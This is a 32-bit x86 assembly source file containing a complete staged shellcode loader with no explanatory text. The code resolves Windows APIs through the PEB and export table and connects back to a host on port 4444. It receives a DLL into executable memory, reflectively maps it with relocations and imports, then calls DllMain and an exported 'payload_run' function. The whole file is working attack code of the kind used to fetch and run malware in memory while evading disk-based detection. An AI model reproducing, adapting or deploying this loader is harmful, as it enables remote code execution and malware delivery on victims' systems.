BITS 32
    call main

str_base:
s_loadlib: db "LoadLibraryA", 0
s_getproc: db "GetProcAddress", 0
s_virtualalloc: db "VirtualAlloc", 0
s_ws2: db "ws2_32.dll", 0
s_wsastartup: db "WSAStartup", 0
s_wsasocket: db "WSASocketA", 0
s_connect: db "connect", 0
s_recv: db "recv", 0
s_payload_fn: db "payload_run", 0

; Clean, human-readable network definitions
RAW_IP   equ 0x7F000001     ; 127.0.0.1
RAW_PORT equ 4444           ; Port 4444

; String offsets relative to str_base (stored in EBP)
%define OFF_LOADLIB (s_loadlib - str_base)
%define OFF_GETPROC (s_getproc - str_base)
%define OFF_VIRTUALALLOC (s_virtualalloc - str_base)
%define OFF_WS2 (s_ws2 - str_base)
%define OFF_WSASTARTUP (s_wsastartup - str_base)
%define OFF_WSASOCKET (s_wsasocket - str_base)
%define OFF_CONNECT (s_connect - str_base)
%define OFF_RECV (s_recv - str_base)
%define OFF_PAYLOAD_FN (s_payload_fn - str_base)

; Local variable definitions on the STACK (relative to ESP)
%define VAR_LOADLIB      [esp+0]
%define VAR_VIRTUALALLOC [esp+4]
%define VAR_RECV         [esp+8]
%define VAR_RAW_BUF      [esp+12]
%define VAR_IMAGE_BASE   [esp+16]
%define VAR_TOTAL_SIZE   20

main:
    pop ebp                 ; EBP now points to str_base
    sub esp, VAR_TOTAL_SIZE ; Allocate local variables safely on the stack

    ; 1. Locate Kernel32 Base via PEB
    mov eax, [fs:0x30]
    mov eax, [eax+0x0C]
    mov eax, [eax+0x14]
    mov eax, [eax]
    mov eax, [eax]
    mov ebx, [eax+0x10]     ; EBX = Kernel32 Base

    ; 2. Parse Kernel32 Export Directory to find GetProcAddress
    mov edx, [ebx+0x3C]
    add edx, ebx
    mov edx, [edx+0x78]
    add edx, ebx
    mov ecx, [edx+0x18]
    mov edi, [edx+0x20]
    add edi, ebx

.find_gpa:
    dec ecx
    mov eax, [edi+ecx*4]
    add eax, ebx
    cmp dword [eax], 0x50746547     ; "GetP"
    jne .find_gpa
    cmp dword [eax+4], 0x41636F72   ; "rocA"
    jne .find_gpa

    mov edi, [edx+0x24]
    add edi, ebx
    movzx ecx, word [edi+ecx*2]
    mov edi, [edx+0x1C]
    add edi, ebx
    mov eax, [edi+ecx*4]
    add eax, ebx
    mov esi, eax                    ; ESI = GetProcAddress function pointer

    ; 3. Resolve Basic API Functions
    lea eax, [ebp+OFF_LOADLIB]
    push eax
    push ebx
    call esi
    mov VAR_LOADLIB, eax

    lea eax, [ebp+OFF_VIRTUALALLOC]
    push eax
    push ebx
    call esi
    mov VAR_VIRTUALALLOC, eax

    ; 4. Initialize Network (Winsock)
    lea eax, [ebp+OFF_WS2]
    push eax
    call dword VAR_LOADLIB
    mov ebx, eax                    ; EBX = ws2_32.dll base

    lea eax, [ebp+OFF_WSASTARTUP]
    push eax
    push ebx
    call esi
    
    sub esp, 400                    ; Allocate WSADATA struct
    mov ecx, esp
    push ecx
    push 0x0202
    call eax
    add esp, 400                    ; Clean up WSADATA

    ; WSASocketA
    lea eax, [ebp+OFF_WSASOCKET]
    push eax
    push ebx
    call esi
    push 0
    push 0
    push 0
    push 0
    push 1
    push 2
    call eax
    mov edi, eax                    ; EDI = Socket Descriptor

    ; Connect
    lea eax, [ebp+OFF_CONNECT]
    push eax
    push ebx
    call esi
    mov ecx, eax                    ; ECX = connect function pointer

    ; --- Fix Network Byte Order at Runtime ---
    mov eax, RAW_IP
    bswap eax                       ; Convert 127.0.0.1 to Big-Endian Network Byte Order
    
    mov dx, RAW_PORT
    xchg dh, dl                     ; Convert 4444 to Big-Endian Network Byte Order

    ; --- Build sockaddr_in structure cleanly on stack ---
    push eax                        ; sin_addr.s_addr
    push dx                         ; sin_port
    push word 2                     ; sin_family (AF_INET = 2)
    mov eax, esp                    ; EAX = Pointer to sockaddr_in structure

    push 16                         ; sizeof(sockaddr_in)
    push eax                        ; struct pointer
    push edi                        ; socket
    call ecx
    add esp, 8                      ; Restore stack frame from sockaddr_in components

    ; Resolve recv
    lea eax, [ebp+OFF_RECV]
    push eax
    push ebx
    call esi
    mov VAR_RECV, eax

    ; 5. Receive Payload Size and Allocate Staging Buffer
    sub esp, 4
    mov ecx, esp
    push 0
    push 4
    push ecx
    push edi
    call dword VAR_RECV
    mov ebx, [esp]                  ; EBX = Size of incoming DLL
    add esp, 4

    ; VirtualAlloc staging buffer
    push 0x40                       ; PAGE_EXECUTE_READWRITE
    push 0x3000                     ; MEM_COMMIT | MEM_RESERVE
    push ebx
    push 0
    call dword VAR_VIRTUALALLOC
    mov VAR_RAW_BUF, eax

    ; 6. Receive Data Loop
    mov ecx, eax                    ; ECX = Write cursor
    push ebx                        ; Save size token to restore after loop

.recv_loop:
    test ebx, ebx
    jz .recv_done
    push 0
    push ebx
    push ecx
    push edi
    call dword VAR_RECV
    test eax, eax
    jle .recv_done
    add ecx, eax
    sub ebx, eax
    jmp .recv_loop

.recv_done:
    pop ebx
    mov edx, VAR_RAW_BUF

    ; 7. Parse PE Headers & Allocate Virtual Target Image Space
    mov eax, [edx+0x3C]             ; EAX = DOS->e_lfanew
    add eax, edx                    ; EAX = PE Header Address
    mov ecx, [eax+0x50]             ; ECX = SizeOfImage

    push 0x40                       ; PAGE_EXECUTE_READWRITE
    push 0x3000                     ; MEM_COMMIT | MEM_RESERVE
    push ecx
    push dword [eax+0x34]           ; Try Preferred ImageBase
    call dword VAR_VIRTUALALLOC
    test eax, eax
    jnz .got_base

    push 0x40
    push 0x3000
    push ecx
    push 0                          ; Fallback to dynamic allocation
    call dword VAR_VIRTUALALLOC

.got_base:
    mov VAR_IMAGE_BASE, eax
    
    ; Copy Headers
    mov esi, edx
    mov edi, eax
    mov ecx, [edx+0x3C]
    add ecx, edx
    mov ecx, [ecx+0x54]             ; SizeOfHeaders
    cld
    rep movsb

    ; 8. Map PE Sections
    mov esi, [edx+0x3C]
    add esi, edx                    ; ESI = NT Headers
    movzx ecx, word [esi+0x06]      ; Number of Sections
    movzx eax, word [esi+0x14]      ; Size of Optional Header
    add esi, 0x18                   ; Skip File Header
    add esi, eax                    ; ESI = First Section Header Pointer

.map_sections:
    test ecx, ecx
    jz .sections_done
    push ecx                        ; Store section loop counter

    mov edi, [esi+0x0C]             ; VirtualAddress RVA
    add edi, VAR_IMAGE_BASE         ; Destination address
    mov eax, [esi+0x10]             ; SizeOfRawData
    
    push esi                        ; Preserve Section Header tracker
    mov esi, [esi+0x14]             ; PointerToRawData
    add esi, edx                    ; Source address inside staging buffer
    
    mov ecx, eax
    cld
    rep movsb                       ; Copy Section payload
    
    pop esi                         ; Restore Section Header tracker
    add esi, 0x28                   ; Increment to next section (Size of IMAGE_SECTION_HEADER = 40 bytes / 0x28)
    pop ecx                         ; Restore loop counter
    dec ecx
    jmp .map_sections

.sections_done:
    ; 9. Process Base Relocations
    mov eax, VAR_IMAGE_BASE
    mov ecx, [edx+0x3C]
    add ecx, edx                    ; ECX = NT Header
    mov esi, eax
    sub esi, [ecx+0x34]             ; ESI = Delta (Current Base - Preferred Base)
    test esi, esi
    jz .reloc_done                  ; Skip if delta is 0

    ; Data Directory index 5 = Relocation Directory
    mov edi, [ecx+0xA0]             ; Relocation Directory RVA
    test edi, edi
    jz .reloc_done
    add edi, VAR_IMAGE_BASE         ; EDI = Absolute address of Relocation Block

.reloc_block:
    mov ecx, [edi+4]                ; SizeOfBlock
    test ecx, ecx
    jz .reloc_done

    lea edx, [edi+8]                ; EDX = First relocation entry address
    sub ecx, 8
    shr ecx, 1                      ; Count of entries (2 bytes each)

.reloc_entry:
    test ecx, ecx
    jz .reloc_next_block
    dec ecx

    movzx eax, word [edx]
    add edx, 2
    mov ebx, eax
    shr ebx, 12                     ; Check type
    cmp ebx, 3                      ; IMAGE_REL_BASED_HIGHLOW
    jne .reloc_entry

    and eax, 0x0FFF                 ; Extract offset
    add eax, [edi]                  ; Add Page RVA
    add eax, VAR_IMAGE_BASE         ; Absolute target address
    add [eax], esi                  ; Apply relocation delta
    jmp .reloc_entry

.reloc_next_block:
    add edi, [edi+4]                ; Advance to next Relocation block
    jmp .reloc_block

.reloc_done:
    ; 10. Process Import Table
    mov eax, VAR_IMAGE_BASE
    mov ecx, [eax+0x3C]
    add ecx, eax                    ; Mapped NT Header
    mov edi, [ecx+0x80]             ; Import Directory RVA
    test edi, edi
    jz .imports_done
    add edi, eax                    ; EDI = Absolute First Import Descriptor

.import_dll:
    cmp dword [edi+0x0C], 0         ; Name RVA check
    je .imports_done
    
    mov ebx, [edi+0x0C]
    add ebx, VAR_IMAGE_BASE         ; DLL Name String
    push ebx
    call dword VAR_LOADLIB
    mov ebx, eax                    ; EBX = Loaded Module Handle

    ; Select OriginalFirstThunk (INT) or fall back to FirstThunk (IAT)
    mov edx, [edi]
    test edx, edx
    jnz .use_int
    mov edx, [edi+0x10]

.use_int:
    add edx, VAR_IMAGE_BASE         ; Absolute lookup pointer
    mov ecx, [edi+0x10]
    add ecx, VAR_IMAGE_BASE         ; Absolute writing pointer (IAT)

.import_func:
    mov eax, [edx]
    test eax, eax
    jz .import_dll_next

    test eax, 0x80000000            ; Import by Ordinal?
    jnz .by_ordinal

    add eax, VAR_IMAGE_BASE
    add eax, 2                      ; Skip Hint field to point to function Name string
    push eax
    push ebx
    call esi                        ; GetProcAddress
    jmp .store_iat

.by_ordinal:
    and eax, 0x7FFFFFFF
    push eax
    push ebx
    call esi                        ; GetProcAddress

.store_iat:
    mov [ecx], eax                  ; Save pointer to IAT
    add edx, 4                      ; Next function entry
    add ecx, 4                      ; Next IAT write address
    jmp .import_func

.import_dll_next:
    add edi, 0x14                   ; Move to next Import Descriptor (20 bytes)
    jmp .import_dll

.imports_done:
    ; 11. Execute DllMain (DLL_PROCESS_ATTACH)
    mov eax, VAR_IMAGE_BASE
    mov ecx, [eax+0x3C]
    add ecx, eax
    mov ecx, [ecx+0x28]             ; AddressOfEntryPoint RVA
    test ecx, ecx
    jz .call_payload
    add ecx, eax                    ; Absolute EntryPoint address
    
    push 0                          ; lpvReserved = NULL
    push 1                          ; fdwReason = DLL_PROCESS_ATTACH
    push eax                        ; hinstDLL = Base Address
    call ecx                        ; Call DllMain

.call_payload:
    ; 12. Locate Exported payload_run Function & Execute
    lea eax, [ebp+OFF_PAYLOAD_FN]
    push eax
    push dword VAR_IMAGE_BASE
    call esi                        ; GetProcAddress(Target, "payload_run")
    test eax, eax
    jz .exit
    call eax                        ; Execute target payload function

.exit:
    add esp, VAR_TOTAL_SIZE         ; Restore the allocated stack area cleanly
    ret